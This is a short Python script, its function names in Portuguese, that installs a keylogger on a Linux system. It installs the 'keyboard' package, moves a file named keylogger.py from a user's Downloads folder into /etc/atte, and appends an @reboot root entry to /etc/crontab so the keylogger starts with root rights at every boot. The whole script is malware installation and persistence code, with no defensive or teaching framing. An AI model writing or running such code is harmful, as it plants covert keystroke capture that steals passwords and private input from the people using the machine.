import os


def dependencias():
    os.system('sudo apt-get install pip -y')
    os.system('sudo pip3 install keyboard')


def instalar():
    os.mkdir('/etc/atte')
    os.system('sudo mv /home/utfpr/Downloads/keylogger.py /etc/atte')
    cron = open('/etc/crontab', 'a')
    cron.write('@reboot         root   sudo  /usr/bin/python3 /etc/atte/keylogger.py')
    cron.close()


dependencias()
instalar()